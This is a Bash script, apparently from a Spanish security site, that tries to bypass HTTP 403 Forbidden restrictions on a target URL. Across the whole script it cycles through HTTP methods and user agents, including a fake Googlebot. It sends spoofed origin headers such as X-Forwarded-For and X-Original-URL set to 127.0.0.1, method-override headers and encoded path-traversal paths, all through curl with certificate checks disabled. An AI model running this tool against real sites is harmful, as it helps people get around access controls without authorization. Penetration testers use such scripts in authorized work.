#!/bin/bash
echo
echo "(C) hackingyseguridad.com 2022"
echo
echo "Uso.: ./bypass400.sh https://url"
echo

URL="$1"

# Lista de métodos HTTP para probar
METHODS="GET POST PUT DELETE TRACE TRACK OPTIONS CONNECT PATCH ACL ARBITRARY PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK"

# Lista de User-Agents
USER_AGENTS="
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Googlebot/2.1 (+http://www.google.com/bot.html)
"

echo "=============================================="
echo "Probando bypass 403 Forbidden en: $URL"
echo "=============================================="
echo ""

# Función para probar un método con headers
test_method() {
    METHOD="$1"
    UA="$2"

    echo "Probando método: $METHOD"
    echo "User-Agent: $UA"
    echo "----------------------------------------------"

    # Extraer dominio para headers
    DOMAIN=$(echo "$URL" | sed 's|https*://||' | sed 's|/.*||')

    curl -k -s --http1.0 \
        -X "$METHOD" \
        -H "Host: $DOMAIN" \
        -H "X-Custom-IP-Authorization: 127.0.0.1" \
        -H "X-HTTP-Method-Override: ACL" \
        -H "Referer: $URL" \
        -H "X-Originating-IP: 127.0.0.1" \
        -H "X-Forwarded-For: 127.0.0.1" \
        -H "X-Forwarded-Host: $DOMAIN" \
        -H "X-Forwarded-Server: $DOMAIN" \
        -H "X-Real-IP: 127.0.0.1" \
        -H "X-Remote-IP: 127.0.0.1" \
        -H "X-Remote-Addr: 127.0.0.1" \
        -H "X-Client-IP: 127.0.0.1" \
        -H "X-Proxy-IP: 127.0.0.1" \
        -H "User-Agent: $UA" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
        -H "Connection: keep-alive" \
        -H "X-Method-Override: ARBITRARY" \
        -H "X-Original-URL: $URL" \
        -H "X-Rewrite-URL: $URL" \
        -w "\nCódigo HTTP: %{http_code}\nTamaño: %{size_download} bytes\nTiempo: %{time_total}s\n" \
        "$URL"

    echo ""
}

# Probar cada método con diferentes User-Agents
echo "$USER_AGENTS" | while read UA; do
    if [ -n "$UA" ]; then
        for METHOD in $METHODS; do
            test_method "$METHOD" "$UA"
            # Pequeña pausa para evitar bloqueos
            sleep 0.5
        done
    fi
done

# Probar también con path traversal y encoding
echo "=============================================="
echo "Probando técnicas adicionales..."
echo "=============================================="

# Lista de técnicas de path traversal
PATHS="
/
/..
/../
/../../
/../../../
/%2e%2e
/%2e%2e/
/%2e%2e%2f
/./
/././
"

for PATH_TRAVERSAL in $PATHS; do
    MODIFIED_URL="${URL%/*}$PATH_TRAVERSAL"
    echo "Probando: $MODIFIED_URL"
    curl -k -s --http1.0 -I "$MODIFIED_URL" -H "X-Forwarded-For: 127.0.0.1" | head -1
    echo ""
done

# Probar con diferentes versiones HTTP
echo "Probando diferentes versiones HTTP..."
curl -k -s --http1.0 -I "$URL" -H "X-Forwarded-For: 127.0.0.1" | head -1
curl -k -s --http1.1 -I "$URL" -H "X-Forwarded-For: 127.0.0.1" | head -1
curl -k -s --http2 -I "$URL" -H "X-Forwarded-For: 127.0.0.1" 2>/dev/null | head -1

echo "=============================================="
echo "Pruebas completadas"
echo "=============================================="

